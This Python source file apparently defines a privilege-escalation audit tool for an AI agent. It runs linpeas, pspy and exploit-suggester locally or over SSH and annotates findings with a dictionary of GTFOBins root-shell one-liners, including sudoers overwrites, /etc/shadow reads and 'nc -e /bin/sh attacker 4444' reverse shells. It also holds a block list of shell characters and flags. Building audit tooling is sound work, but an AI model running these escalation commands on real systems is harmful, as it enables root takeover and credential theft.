#/+
import ipaddress
import json
import os
import re
import socket
import subprocess
import sys
import time
from typing import Any, Optional
import uuid

import paramiko
from pydantic import BaseModel, Field, field_validator

from server.agents.executer.recon.config import is_blocked_host

# ══════════════════════════════════════════════════════════════
# 1. CONSTANTS
# ══════════════════════════════════════════════════════════════

_ALLOWED_TOOLS = frozenset({"linpeas", "linux-exploit-suggester", "pspy", "manual"})
_ALLOWED_MODES = frozenset({
    "full_audit",
    "suid_sgid", "sudo_misconfig", "cron_jobs", "writable_paths",
    "capabilities", "kernel_exploits", "docker_lxc", "network_info", "password_files",
    "les_kernel", "les_extended",
    "pspy_procs", "pspy_cron",
    "manual_suid", "manual_caps", "manual_writable", "manual_cron",
    "manual_sudo", "manual_docker", "manual_env",
})
_DANGEROUS     = frozenset({";", "&&", "||", "|", "`", "$(", ">>", "'", '"', "\n", "\r"})
_BLOCKED_FLAGS = frozenset({"--upload", "--reverse-shell", "--exploit"})

_RAW_LIMIT = 8_000
_ERR_LIMIT = 1_000
_SECTION_RESULT_LIMITS: dict[str, int] = {
    "suid_bins": 64,
    "sudo_rules": 32,
    "cron_jobs": 32,
    "writable_paths": 96,
    "capabilities": 48,
    "kernel_exploits": 48,
    "container_findings": 24,
    "processes": 96,
}

_LINPEAS_BIN = "/tmp/linpeas.sh"
_LES_BIN     = "/tmp/linux-exploit-suggester.sh"
_PSPY_BIN    = "/tmp/pspy64"

_LINPEAS_SECTION: dict[str, str] = {
    "suid_sgid":      "SuidBins",
    "sudo_misconfig": "Sudo",
    "cron_jobs":      "CronJobs",
    "writable_paths": "WritableFiles",
    "capabilities":   "Capabilities",
    "kernel_exploits":"KernelExploits",
    "docker_lxc":     "DockerFiles",
    "network_info":   "NetInfo",
    "password_files": "PasswordsFiles",
}

# Manual mode → command (no shell=True, no shell meta-chars)
_MANUAL_CMDS: dict[str, list[str]] = {
    "manual_suid":    ["find", "/", "-perm", "-4000", "-type", "f", "-ls"],
    "manual_caps":    ["getcap", "-r", "/"],
    "manual_writable":["find", "/", "-writable",
                       "-not", "-path", "*/proc/*",
                       "-not", "-path", "*/sys/*"],
    "manual_cron":    ["cat", "/etc/crontab"],
    "manual_sudo":    ["sudo", "-l"],
    "manual_docker":  ["id"],
    "manual_env":     ["env"],
}

_ANSI_RE = re.compile(r"\x1B(?:[@-Z\\-_]|\[[0-?]*[ -/]*[@-~])")


# ══════════════════════════════════════════════════════════════
# 2. GTFOBINS + CAPABILITIES  (offline, no network)
# ══════════════════════════════════════════════════════════════

# Duplicate keys removed — last value wins in plain dicts, so we use unique keys
GTFOBINS: dict[str, str] = {
    "bash":       "SUID/sudo bash → /bin/bash -p  or  sudo bash → root shell",
    "dash":       "SUID dash: /bin/dash -p → root",
    "sh":         "sudo sh → root shell",
    "zsh":        "SUID zsh → root shell",
    "ksh":        "SUID ksh → root shell",
    "csh":        "SUID csh → root shell",
    "tcsh":       "SUID tcsh → root shell",
    "python":     "sudo python -c 'import os; os.system(\"/bin/sh\")'",
    "python2":    "sudo python2 -c 'import os; os.system(\"/bin/sh\")'",
    "python3":    "sudo python3 -c 'import os; os.setuid(0); os.system(\"/bin/sh\")'",
    "perl":       "sudo perl -e 'exec \"/bin/sh\";'",
    "ruby":       "sudo ruby -e 'exec \"/bin/sh\"'",
    "php":        "sudo php -r 'system(\"/bin/sh\");'",
    "lua":        "sudo lua -e 'os.execute(\"/bin/sh\")'",
    "awk":        "sudo awk 'BEGIN {system(\"/bin/sh\")}'",
    "nmap":       "sudo nmap --interactive → !sh  (versions < 5.21)",
    "vim":        "sudo vim -c ':!/bin/sh'",
    "vi":         "sudo vi -c ':!/bin/sh'",
    "nano":       "sudo nano → ^R^X → reset; sh 1>&0 2>&0",
    "less":       "sudo less /etc/passwd → !sh",
    "more":       "sudo more /etc/passwd → !sh",
    "man":        "sudo man man → !sh",
    "find":       "sudo find . -exec /bin/sh \\; -quit",
    "tee":        "echo 'ALL ALL=(ALL) NOPASSWD: ALL' | sudo tee /etc/sudoers.d/pwned",
    "cp":         "sudo cp /bin/bash /tmp/rootbash && sudo chmod +s /tmp/rootbash",
    "mv":         "overwrite sensitive files (e.g. /etc/passwd)",
    "cat":        "SUID cat → read /etc/shadow",
    "tail":       "SUID tail → read /etc/shadow",
    "head":       "SUID head → read /etc/shadow",
    "base64":     "base64 /etc/shadow | base64 --decode",
    "xxd":        "xxd /etc/shadow | xxd -r",
    "tar":        "sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh",
    "zip":        "sudo zip /tmp/x.zip /tmp/x -T --unzip-command='sh -c /bin/sh'",
    "curl":       "sudo curl file:///etc/shadow",
    "wget":       "sudo wget file:///etc/shadow",
    "ftp":        "sudo ftp → ! /bin/sh",
    "ssh":        "sudo ssh -o ProxyCommand=';sh 0<&2 1>&2' x",
    "git":        "sudo git -p help → !sh",
    "gcc":        "sudo gcc -wrapper /bin/sh,-s",
    "make":       "sudo make -s --eval=$'x:\\n\\t-'exec /bin/sh",
    "env":        "sudo env /bin/sh",
    "strace":     "sudo strace -o /dev/null /bin/sh",
    "time":       "sudo time /bin/sh",
    "watch":      "sudo watch -x sh -c 'reset; exec sh 1>&0 2>&0'",
    "taskset":    "sudo taskset 1 /bin/sh",
    "nice":       "sudo nice /bin/sh",
    "ionice":     "sudo ionice /bin/sh",
    "setarch":    "sudo setarch $(arch) /bin/sh",
    "systemctl":  "sudo systemctl → write unit file → ExecStart=/bin/bash",
    "journalctl": "sudo journalctl → !sh",
    "mount":      "sudo mount -o bind /bin/bash /bin/sh",
    "chmod":      "sudo chmod +s /bin/bash → /bin/bash -p",
    "chown":      "sudo chown root:root /bin/bash && chmod +s /bin/bash",
    "dd":         "sudo dd if=/etc/shadow",
    "od":         "od -c /etc/shadow",
    "screen":     "sudo screen -x root/",
    "tmux":       "sudo tmux -S /tmp/s new-session -d; sudo tmux -S /tmp/s",
    "socat":      "sudo socat stdin exec:/bin/sh",
    "nc":         "sudo nc -e /bin/sh attacker 4444",
    "netcat":     "sudo nc -e /bin/sh attacker 4444",
    "ncat":       "sudo ncat -e /bin/sh attacker 4444",
    "docker":     "docker run -v /:/mnt --rm -it alpine chroot /mnt sh",
    "lxc":        "lxc init ubuntu:16.04 privesc -c security.privileged=true",
    "pkexec":     "CVE-2021-4034 (Pwnkit) — affects polkit < 0.120",
    "node":       "sudo node -e 'require(\"child_process\").spawn(\"/bin/sh\",{stdio:[0,1,2]})'",
    "npm":        "sudo npm run env --",
    "pip":        "sudo pip install --upgrade . (malicious setup.py)",
    "pip3":       "sudo pip3 install --upgrade . (malicious setup.py)",
    "mysql":      "sudo mysql -e '\\! /bin/sh'",
    "sqlite3":    "sudo sqlite3 /dev/null '.shell /bin/sh'",
    "psql":       "sudo psql -c '\\! /bin/sh'",
    "openssl":    "sudo openssl enc -in /etc/shadow",
    "rsync":      "sudo rsync -e 'sh -c \"sh 0<&2 1>&2\"' 127.0.0.1:/dev/null",
    "xargs":      "sudo xargs -a /dev/null sh",
    "passwd":     "SUID passwd → overwrite /etc/passwd",
    "su":         "sudo su → root",
    "capsh":      "sudo capsh --gid=0 --uid=0 --",
    "expect":     "sudo expect -c 'spawn /bin/sh;interact'",
    "tclsh":      "sudo tclsh → exec /bin/sh",
    "irb":        "sudo irb → exec '/bin/sh'",
    "knife":      "sudo knife exec -E 'exec \"/bin/sh\"'",
}

DANGEROUS_CAPS: dict[str, str] = {
    "cap_setuid":          "Set UID=0 → instant root",
    "cap_setgid":          "Set GID=0 → root group",
    "cap_sys_admin":       "Broad admin: mount, ioctl, container escape",
    "cap_sys_ptrace":      "ptrace any process → inject shellcode into root process",
    "cap_dac_override":    "Bypass DAC — read/write any file including /etc/shadow",
    "cap_dac_read_search": "Read any file/dir → /etc/shadow",
    "cap_chown":           "chown any file → chown /etc/shadow",
    "cap_fowner":          "Bypass owner permission checks",
    "cap_net_raw":         "Raw sockets → ARP/ICMP spoofing",
    "cap_sys_rawio":       "Raw I/O → read kernel memory",
    "cap_sys_module":      "Load kernel modules → rootkit",
    "cap_sys_chroot":      "chroot to arbitrary path",
    "cap_kill":            "Send signals to any process",
    "cap_mknod":           "Create device files",
}


def _check_gtfobins(binary_path: str) -> tuple[bool, Optional[str]]:
    name = os.path.basename(binary_path).lower()
    note = GTFOBINS.get(name)
    return (True, note) if note else (False, None)


def _check_caps(cap_string: str) -> Optional[str]:
    notes = [f"{cap}: {note}" for cap, note in DANGEROUS_CAPS.items()
             if cap in cap_string.lower()]
    return " | ".join(notes) if notes else None


def _strip_ansi(text: str) -> str:
    return _ANSI_RE.sub("", text)


# ══════════════════════════════════════════════════════════════
# 3. SCHEMAS
# ══════════════════════════════════════════════════════════════

class PrivescAuditRequest(BaseModel):
    tool:    str
    mode:    str
    target:  Optional[str] = None
    username:Optional[str] = None
    password:Optional[str] = None
    key_path:Optional[str] = None
    args:    list[str] = []
    timeout: int       = Field(default=300, ge=10, le=3600)

    @field_validator("target")
    @classmethod
    def validate_target(cls, v: Optional[str]) -> Optional[str]:
        if not v:
            return v
        v = v.strip()
        if not v:
            return None
        if is_blocked_host(v.lower()):
            raise ValueError(f"Target '{v}' is blocked")
        return v

    @field_validator("username", "password", "key_path", mode="before")
    @classmethod
    def validate_creds(cls, v: Optional[str]) -> Optional[str]:
        if not v:
            return v
        for ch in _DANGEROUS:
            if ch in v:
                raise ValueError(f"Dangerous character {ch!r} in parameter")
        return v

    @field_validator("tool")
    @classmethod
    def validate_tool(cls, v: str) -> str:
        if v not in _ALLOWED_TOOLS:
            raise ValueError(f"tool must be one of: {sorted(_ALLOWED_TOOLS)}")
        return v

    @field_validator("mode")
    @classmethod
    def validate_mode(cls, v: str) -> str:
        if v not in _ALLOWED_MODES:
            raise ValueError(f"mode must be one of: {sorted(_ALLOWED_MODES)}")
        return v

    @field_validator("args", mode="before")
    @classmethod
    def validate_args(cls, v: list[str]) -> list[str]:
        for arg in v:
            for ch in _DANGEROUS:
                if ch in arg:
                    raise ValueError(f"Dangerous character {ch!r} in arg: {arg!r}")
            if arg.strip() in _BLOCKED_FLAGS:
                raise ValueError(f"Blocked flag: {arg!r}")
        return v


class SUIDResult(BaseModel):
    path:         str
    permissions:  Optional[str] = None
    owner:        Optional[str] = None
    group:        Optional[str] = None
    gtfobins:     Optional[bool] = None
    exploit_note: Optional[str] = None


class SudoResult(BaseModel):
    runas:        Optional[str] = None
    command:      str
    nopasswd:     bool          = False
    gtfobins:     Optional[bool] = None
    exploit_note: Optional[str] = None


class CronResult(BaseModel):
    schedule:     Optional[str] = None
    user:         Optional[str] = None
    command:      str
    source:       Optional[str] = None
    writable:     Optional[bool] = None
    exploit_note: Optional[str] = None


class WritableResult(BaseModel):
    path:         str
    permissions:  Optional[str] = None
    owner:        Optional[str] = None
    path_type:    Optional[str] = None
    exploit_note: Optional[str] = None


class CapabilityResult(BaseModel):
    path:         str
    capabilities: str
    exploit_note: Optional[str] = None


class KernelExploitResult(BaseModel):
    cve:            Optional[str] = None
    name:           Optional[str] = None
    severity:       Optional[str] = None
    kernel_version: Optional[str] = None
    url:            Optional[str] = None
    notes:          Optional[str] = None


class ContainerResult(BaseModel):
    finding:      str
    detail:       Optional[str] = None
    exploit_note: Optional[str] = None


class ProcessResult(BaseModel):
    uid:          Optional[str] = None
    pid:          Optional[str] = None
    command:      str
    timestamp:    Optional[str] = None
    triggered_by: Optional[str] = None


class PrivescAuditResult(BaseModel):
    success:            bool
    tool:               str
    mode:               str
    command:            str
    hostname:           Optional[str]           = None
    kernel_version:     Optional[str]           = None
    current_user:       Optional[str]           = None
    suid_bins:          list[SUIDResult]         = []
    sudo_rules:         list[SudoResult]         = []
    cron_jobs:          list[CronResult]         = []
    writable_paths:     list[WritableResult]     = []
    capabilities:       list[CapabilityResult]   = []
    kernel_exploits:    list[KernelExploitResult] = []
    container_findings: list[ContainerResult]    = []
    processes:          list[ProcessResult]      = []
    raw_output:         Optional[str]            = None
    error:              Optional[str]            = None
    execution_time:     float                    = 0.0


def _apply_result_limits(result: PrivescAuditResult) -> PrivescAuditResult:
    truncation_notes: list[str] = []

    for field_name, limit in _SECTION_RESULT_LIMITS.items():
        items = getattr(result, field_name, None)
        if not isinstance(items, list):
            continue
        original_count = len(items)
        if original_count <= limit:
            continue
        setattr(result, field_name, items[:limit])
        truncation_notes.append(f"{field_name}:{original_count}->{limit}")

    if truncation_notes:
        prefix = "[truncated] " + ", ".join(truncation_notes)
        existing = result.raw_output or ""
        result.raw_output = f"{prefix}\n{existing}".strip()[:_RAW_LIMIT]

    return result


# ══════════════════════════════════════════════════════════════
# 4. EXECUTOR
# ══════════════════════════════════════════════════════════════

def _ssh_execute(req: PrivescAuditRequest, cmd_list: list[str]) -> tuple[str, str, int]:
    """Execute via Paramiko natively over SSH."""
    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    
    # 1. Connect
    try:
        client.connect(
            hostname=req.target,
            username=req.username,
            password=req.password,
            key_filename=req.key_path,
            timeout=10,
        )
    except Exception as e:
        return "", f"SSH Connection failed: {e}", -1

    try:
        # 2. Logic router for memory staging
        if req.tool in ("linpeas", "linux-exploit-suggester"):
            # Stream script directly into bash via stdin
            local_bin = _LINPEAS_BIN if req.tool == "linpeas" else _LES_BIN
            base_cmd = " ".join(cmd_list[2:])  # remove 'bash /tmp/...sh'
            ssh_cmd = f"bash -s -- {base_cmd}"
            try:
                with open(local_bin, "r") as f:
                    script_data = f.read()
            except IOError:
                return "", f"Local script {local_bin} not found to upload", 127
                
            stdin, stdout, stderr = client.exec_command(ssh_cmd, timeout=req.timeout)
            stdin.write(script_data)
            stdin.channel.shutdown_write()
            
            out = stdout.read().decode(errors="replace")
            err = stderr.read().decode(errors="replace")
            return out, err, stdout.channel.recv_exit_status()
            
        elif req.tool == "pspy":
            # Pspy is compiled. Must drop to disk via SFTP.
            remote_bin = f"/tmp/.p_{uuid.uuid4().hex[:6]}"
            try:
                sftp = client.open_sftp()
                sftp.put(_PSPY_BIN, remote_bin)
                sftp.chmod(remote_bin, 0o755)
                sftp.close()
            except Exception as e:
                return "", f"SFTP upload failed for pspy: {e}", -1
            
            ssh_cmd = " ".join([remote_bin] + cmd_list[1:])
            try:
                stdin, stdout, stderr = client.exec_command(ssh_cmd, timeout=req.timeout)
                out = stdout.read().decode(errors="replace")
                err = stderr.read().decode(errors="replace")
                rc = stdout.channel.recv_exit_status()
            finally:
                # Always rip it off disk
                client.exec_command(f"rm -f {remote_bin}")
                
            return out, err, rc
            
        else:
            # Manual mode (or standard commands) directly execute over SSH channel
            ssh_cmd = " ".join(cmd_list)
            stdin, stdout, stderr = client.exec_command(ssh_cmd, timeout=req.timeout)
            out = stdout.read().decode(errors="replace")
            err = stderr.read().decode(errors="replace")
            return out, err, stdout.channel.recv_exit_status()
            
    except Exception as e:
        return "", f"SSH Execution error: {e}", -1
    finally:
        client.close()


def _safe_execute(cmd: list[str], timeout: int) -> tuple[str, str, int]:
    try:
        proc = subprocess.Popen(
            cmd,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            text=True,
            shell=False,
        )
        try:
            stdout, stderr = proc.communicate(timeout=timeout)
            return stdout, stderr, proc.returncode
        except subprocess.TimeoutExpired:
            proc.kill()
            stdout, stderr = proc.communicate()
            return (
                stdout or "",
                (stderr or "") + f"\n[timeout] killed after {timeout}s",
                -1,
            )
    except FileNotFoundError:
        return "", f"Tool '{cmd[0]}' not installed or not found at path", 127
    except Exception as exc:
        return "", str(exc), -1


# ══════════════════════════════════════════════════════════════
# 5. PARSERS
# ══════════════════════════════════════════════════════════════

def _parse_linpeas(stdout: str, mode: str, command: str) -> PrivescAuditResult:
    clean = _strip_ansi(stdout)
    result = PrivescAuditResult(success=True, tool="linpeas", mode=mode, command=command)

    # ── System info ──────────────────────────────────────────
    m = re.search(r"Linux version\s+(\S+)", clean)
    if m:
        result.kernel_version = m.group(1)

    m = re.search(r"Hostname:\s*(\S+)", clean, re.IGNORECASE)
    if m:
        result.hostname = m.group(1)

    m = re.search(r"Current user:\s*(\S+)", clean, re.IGNORECASE)
    if m:
        result.current_user = m.group(1)

    # ── SUID/SGID ────────────────────────────────────────────
    suid_sec = re.search(
        r"SUID.*?binaries(.*?)(?=={3,}|\Z)", clean, re.DOTALL | re.IGNORECASE
    )
    seen_suid: set[str] = set()
    if suid_sec:
        for m in re.finditer(r"(/\S+)", suid_sec.group(1)):
            path = m.group(1)
            if path not in seen_suid:
                seen_suid.add(path)
                gtf, note = _check_gtfobins(path)
                result.suid_bins.append(SUIDResult(path=path, gtfobins=gtf, exploit_note=note))

    # Fallback: -rws permission lines
    for m in re.finditer(r"-rws\S*\s+\S+\s+\S+\s+(/\S+)", clean):
        path = m.group(1)
        if path not in seen_suid:
            seen_suid.add(path)
            gtf, note = _check_gtfobins(path)
            result.suid_bins.append(SUIDResult(path=path, gtfobins=gtf, exploit_note=note))

    # ── Sudo rules ───────────────────────────────────────────
    sudo_sec = re.search(
        r"sudo -l(.*?)(?=={3,}|\Z)", clean, re.DOTALL | re.IGNORECASE
    )
    raw_sudo = sudo_sec.group(1) if sudo_sec else clean
    for m in re.finditer(r"\((\S+)\)\s*(NOPASSWD:\s*)?(/\S+|\bALL\b)", raw_sudo):
        cmd_str  = m.group(3).strip()
        nopasswd = bool(m.group(2))
        gtf, note = _check_gtfobins(cmd_str)
        result.sudo_rules.append(SudoResult(
            runas=m.group(1), command=cmd_str,
            nopasswd=nopasswd, gtfobins=gtf, exploit_note=note,
        ))

    # ── Cron jobs ────────────────────────────────────────────
    cron_sec = re.search(
        r"Cron jobs(.*?)(?=={3,}|\Z)", clean, re.DOTALL | re.IGNORECASE
    )
    if cron_sec:
        for m in re.finditer(
            r"(\*[/\d\*\s,\-]+|@\w+)\s+(\w+)\s+(/.+?)(?:\n|$)",
            cron_sec.group(1),
        ):
            result.cron_jobs.append(CronResult(
                schedule=m.group(1).strip(),
                user=m.group(2),
                command=m.group(3).strip(),
            ))

    # ── Writable paths ───────────────────────────────────────
    writable_sec = re.search(
        r"Writable.*?files(.*?)(?=={3,}|\Z)", clean, re.DOTALL | re.IGNORECASE
    )
    if writable_sec:
        for m in re.finditer(r"(/\S+)", writable_sec.group(1)):
            result.writable_paths.append(WritableResult(path=m.group(1)))

    # ── Capabilities ─────────────────────────────────────────
    cap_sec = re.search(
        r"Capabilities(.*?)(?=={3,}|\Z)", clean, re.DOTALL | re.IGNORECASE
    )
    if cap_sec:
        for m in re.finditer(r"(/\S+)\s+=\s+(\S+)", cap_sec.group(1)):
            note = _check_caps(m.group(2))
            result.capabilities.append(CapabilityResult(
                path=m.group(1), capabilities=m.group(2), exploit_note=note,
            ))

    # ── Docker/container ─────────────────────────────────────
    if re.search(r"\bdocker\b", clean, re.IGNORECASE):
        for dm in re.findall(r"(docker[^\n]+)", clean, re.IGNORECASE)[:10]:
            dm = dm.strip()
            if dm:
                result.container_findings.append(ContainerResult(
                    finding=dm,
                    exploit_note=GTFOBINS.get("docker") if "group" in dm.lower() else None,
                ))

    return result


def _parse_les(stdout: str, command: str) -> PrivescAuditResult:
    clean    = _strip_ansi(stdout)
    exploits: list[KernelExploitResult] = []

    _HIGH_KW = frozenset({
        "root", "privesc", "priv esc", "privilege", "lpe",
        "pwnkit", "dirty", "rds", "overlayfs", "namespace",
    })

    cve_pat = re.compile(
        r"\[\+\]\s+\[?(CVE-[\d\-]+)\]?\s+(.+?)\n"
        r"(?:.*?Details:\s*(https?://\S+))?"
        r"(?:.*?Tags:\s*(.+?))?(?=\[\+\]|\Z)",
        re.DOTALL,
    )
    for m in cve_pat.finditer(clean):
        cve   = m.group(1).strip()
        name  = m.group(2).strip()
        url   = m.group(3).strip() if m.group(3) else None
        tags  = m.group(4).strip() if m.group(4) else None
        combo = (name + " " + (tags or "")).lower()
        severity = "high" if any(kw in combo for kw in _HIGH_KW) else "medium"
        exploits.append(KernelExploitResult(
            cve=cve, name=name, severity=severity, url=url, notes=tags,
        ))

    if not exploits:
        for m in re.finditer(r"\[\+\]\s+(.+?)(?:\n|$)", clean):
            entry = m.group(1).strip()
            if entry:
                cve_inline = re.search(r"CVE-[\d\-]+", entry)
                exploits.append(KernelExploitResult(
                    cve=cve_inline.group(0) if cve_inline else None,
                    name=entry,
                    severity="medium",
                ))

    return PrivescAuditResult(
        success=bool(exploits),
        tool="linux-exploit-suggester",
        mode="",
        command=command,
        kernel_exploits=exploits,
    )


def _parse_pspy(stdout: str, command: str) -> PrivescAuditResult:
    clean    = _strip_ansi(stdout)
    procs: list[ProcessResult] = []

    pat = re.compile(
        r"(\d{4}/\d{2}/\d{2}\s+\d{2}:\d{2}:\d{2})\s+"
        r"CMD:\s+UID=(\d+)\s+PID=(\d+)\s+\|\s+(.+)"
    )
    for m in pat.finditer(clean):
        cmd_str      = m.group(4).strip()
        uid          = m.group(2)
        triggered_by = None
        if "cron" in cmd_str.lower():
            triggered_by = "cron"
        elif uid == "0":
            triggered_by = "root-daemon"
        procs.append(ProcessResult(
            uid=uid, pid=m.group(3),
            command=cmd_str,
            timestamp=m.group(1),
            triggered_by=triggered_by,
        ))

    return PrivescAuditResult(
        success=bool(procs),
        tool="pspy", mode="", command=command,
        processes=procs,
    )


def _parse_manual(stdout: str, stderr: str, mode: str, command: str) -> PrivescAuditResult:
    raw = stdout or stderr
    # stdout may have results even when rc!=0 (find reports /proc errors — normal)
    result = PrivescAuditResult(
        success=bool(stdout.strip()),
        tool="manual", mode=mode, command=command,
    )

    if mode == "manual_suid":
        seen: set[str] = set()
        for line in raw.strip().splitlines():
            line = line.strip()
            if not line:
                continue
            # ls -l style: permissions links owner group size date path
            pm = re.match(r"(?:\s*\d+\s+\d+\s+)?(-\S+)\s+\d+\s+(\S+)\s+(\S+).*?(/\S+)\s*$", line)
            if pm:
                path = pm.group(4)
            elif line.startswith("/"):
                path = line.split()[0]
            else:
                continue
            if path in seen:
                continue
            seen.add(path)
            gtf, note = _check_gtfobins(path)
            result.suid_bins.append(SUIDResult(
                path=path,
                permissions=pm.group(1) if pm else None,
                owner=pm.group(2) if pm else None,
                group=pm.group(3) if pm else None,
                gtfobins=gtf,
                exploit_note=note,
            ))

    elif mode == "manual_caps":
        # getcap: /usr/bin/python3.8 = cap_setuid+eip
        for m in re.finditer(r"(/\S+)\s+=\s+(\S+)", raw):
            note = _check_caps(m.group(2))
            result.capabilities.append(CapabilityResult(
                path=m.group(1), capabilities=m.group(2), exploit_note=note,
            ))

    elif mode == "manual_sudo":
        for m in re.finditer(r"\((\S+)\)\s*(NOPASSWD:\s*)?(/\S+|\bALL\b)", raw):
            cmd_str  = m.group(3).strip()
            nopasswd = bool(m.group(2))
            gtf, note = _check_gtfobins(cmd_str)
            result.sudo_rules.append(SudoResult(
                runas=m.group(1), command=cmd_str,
                nopasswd=nopasswd, gtfobins=gtf, exploit_note=note,
            ))

    elif mode == "manual_cron":
        for m in re.finditer(
            r"(\*[/\d\*\s,\-]+|@\w+)\s+(\w+)?\s*(/\S[^\n]+)", raw
        ):
            result.cron_jobs.append(CronResult(
                schedule=m.group(1).strip(),
                user=m.group(2),
                command=m.group(3).strip(),
            ))

    elif mode == "manual_writable":
        for line in raw.strip().splitlines():
            line = line.strip()
            if line.startswith("/"):
                result.writable_paths.append(WritableResult(path=line))

    elif mode == "manual_docker":
        result.container_findings.append(ContainerResult(
            finding=raw.strip(),
            exploit_note=GTFOBINS.get("docker") if "docker" in raw.lower() else None,
        ))

    elif mode == "manual_env":
        for line in raw.strip().splitlines():
            if line.startswith("PATH="):
                for d in line[5:].split(":"):
                    if d in (".", "", "./", ".."):
                        result.writable_paths.append(WritableResult(
                            path=d,
                            path_type="PATH-hijack",
                            exploit_note=f"Relative PATH entry '{d}' allows command hijacking",
                        ))

    return result


# ══════════════════════════════════════════════════════════════
# 6. COMMAND BUILDERS
# ══════════════════════════════════════════════════════════════

def _build_cmd(req: PrivescAuditRequest) -> tuple[list[str], Optional[str]]:
    """Return (cmd, error_or_None)."""
    tool = req.tool
    mode = req.mode
    args = list(req.args)

    if tool == "linpeas":
        if mode == "full_audit":
            return ["bash", _LINPEAS_BIN] + args, None
        if mode in _LINPEAS_SECTION:
            return ["bash", _LINPEAS_BIN, "-o", _LINPEAS_SECTION[mode]] + args, None
        return ["bash", _LINPEAS_BIN] + args, None

    if tool == "linux-exploit-suggester":
        return ["bash", _LES_BIN] + args, None

    if tool == "pspy":
        if mode == "pspy_cron":
            base = ["-i", "500", "-p"]
        else:
            base = ["-p", "-i", "1000"]
        return [_PSPY_BIN] + (args or base), None

    if tool == "manual":
        if mode == "manual_cron":
            # Read multiple cron sources using bash -c is safe here because
            # all strings are hardcoded literals — no user input in the shell string
            return [
                "bash", "-c",
                "cat /etc/crontab 2>/dev/null; "
                "cat /etc/cron.d/* 2>/dev/null; "
                "cat /var/spool/cron/crontabs/* 2>/dev/null",
            ], None
        if mode in _MANUAL_CMDS:
            return _MANUAL_CMDS[mode] + args, None
        return [], f"No command mapping for manual mode: {mode!r}"

    return [], f"Unknown tool: {tool!r}"


# ══════════════════════════════════════════════════════════════
# 7. MAIN TOOL FUNCTION
# ══════════════════════════════════════════════════════════════

def linux_privesc_audit(
    tool:     str,
    mode:     str,
    target:   Optional[str] = None,
    username: Optional[str] = None,
    password: Optional[str] = None,
    key_path: Optional[str] = None,
    args:     Optional[list[str]] = None,
    timeout:  int                 = 300,
) -> dict[str, Any]:
    """
    Linux Privilege Escalation Audit — agent tool.
    Returns structured dict — never writes to disk.

    Args:
        tool    : linpeas | linux-exploit-suggester | pspy | manual
        mode    : see LINUX_PRIVESC_AUDIT_TOOL_DEFINITION for full list
        args    : extra CLI flags for the underlying tool
        timeout : max wall-clock seconds (30–3600)

    Returns:
        PrivescAuditResult as dict with keys:
        success, tool, mode, command, hostname, kernel_version, current_user,
        suid_bins, sudo_rules, cron_jobs, writable_paths, capabilities,
        kernel_exploits, container_findings, processes, raw_output, error,
        execution_time
    """
    start = time.monotonic()
    args  = args or []

    def _fail(msg: str) -> dict[str, Any]:
        return PrivescAuditResult(
            success=False, tool=tool, mode=mode, command="",
            error=msg,
            execution_time=round(time.monotonic() - start, 2),
        ).model_dump()

    # ── Validate ──────────────────────────────────────────────
    try:
        req = PrivescAuditRequest(
            tool=tool, mode=mode, target=target,
            username=username, password=password, key_path=key_path,
            args=args, timeout=timeout
        )
    except Exception as exc:
        return _fail(f"Validation: {exc}")

    # ── Build command ─────────────────────────────────────────
    cmd, build_err = _build_cmd(req)
    if build_err:
        return _fail(build_err)
    if not cmd:
        return _fail("No command generated")

    # ── Execute ───────────────────────────────────────────────
    command_str = " ".join(cmd)
    if req.target:
        stdout, stderr, rc = _ssh_execute(req, cmd)
    else:
        stdout, stderr, rc = _safe_execute(cmd, req.timeout)

    # ── Parse ─────────────────────────────────────────────────
    if tool == "linpeas":
        result = _parse_linpeas(stdout or stderr, mode, command_str)

    elif tool == "linux-exploit-suggester":
        result = _parse_les(stdout or stderr, command_str)
        result.mode = mode

    elif tool == "pspy":
        result = _parse_pspy(stdout or stderr, command_str)
        result.mode = mode

    else:  # manual
        result = _parse_manual(stdout, stderr, mode, command_str)

    # ── Finalise ──────────────────────────────────────────────
    result.raw_output     = (stdout or stderr)[:_RAW_LIMIT] or None
    result.execution_time = round(time.monotonic() - start, 2)
    result = _apply_result_limits(result)

    # Only surface stderr as error when the run produced nothing useful
    has_findings = any([
        result.suid_bins, result.sudo_rules, result.cron_jobs,
        result.writable_paths, result.capabilities, result.kernel_exploits,
        result.container_findings, result.processes,
    ])
    if rc != 0 and not has_findings and not stdout.strip():
        result.error   = stderr.strip()[:_ERR_LIMIT] or None
        result.success = False

    return result.model_dump()


# ══════════════════════════════════════════════════════════════
# 8. TOOL DEFINITION
# ══════════════════════════════════════════════════════════════

LINUX_PRIVESC_AUDIT_TOOL_DEFINITION: dict[str, Any] = {
    "name": "linux_privesc_audit",
    "description": (
        "Audit the local Linux system for privilege escalation vectors. "
        "Finds SUID/SGID binaries, sudo misconfigs, cron job abuse, writable paths, "
        "dangerous capabilities, kernel CVEs, docker group escapes, and running processes. "
        "Every finding is auto-annotated with GTFOBins exploitation notes (offline). "
        "Supports linpeas, linux-exploit-suggester, pspy, and manual built-in commands."
    ),
    "parameters": {
        "type": "object",
        "properties": {
            "target": {
                "type": "string",
                "description": "Optional: Target IP / Hostname for SSH execution. If omitted, runs natively on the local node.",
            },
            "username": {"type": "string", "description": "SSH username"},
            "password": {"type": "string", "description": "SSH password"},
            "key_path": {"type": "string", "description": "SSH private key path on disk"},
            "tool": {
                "type": "string",
                "enum": sorted(_ALLOWED_TOOLS),
                "description": (
                    "linpeas                  = comprehensive local enum |\n"
                    "linux-exploit-suggester  = kernel CVE matching |\n"
                    "pspy                     = passive process spy (no root needed) |\n"
                    "manual                   = built-in system commands, no external tool"
                ),
            },
            "mode": {
                "type": "string",
                "enum": sorted(_ALLOWED_MODES),
                "description": (
                    "full_audit       → all linpeas checks\n"
                    "suid_sgid        → SUID/SGID binaries\n"
                    "sudo_misconfig   → sudo -l + sudoers\n"
                    "cron_jobs        → cron + writable cron scripts\n"
                    "writable_paths   → world-writable files/dirs\n"
                    "capabilities     → dangerous linux capabilities\n"
                    "kernel_exploits  → kernel CVE suggestions\n"
                    "docker_lxc       → docker/lxc group escape\n"
                    "network_info     → interfaces, ports, hosts\n"
                    "password_files   → /etc/shadow, .ssh, history\n"
                    "les_kernel       → kernel CVE matching (LES)\n"
                    "les_extended     → kernel + userspace CVEs (LES)\n"
                    "pspy_procs       → watch all processes\n"
                    "pspy_cron        → watch for UID=0 cron triggers\n"
                    "manual_suid      → find / -perm -4000\n"
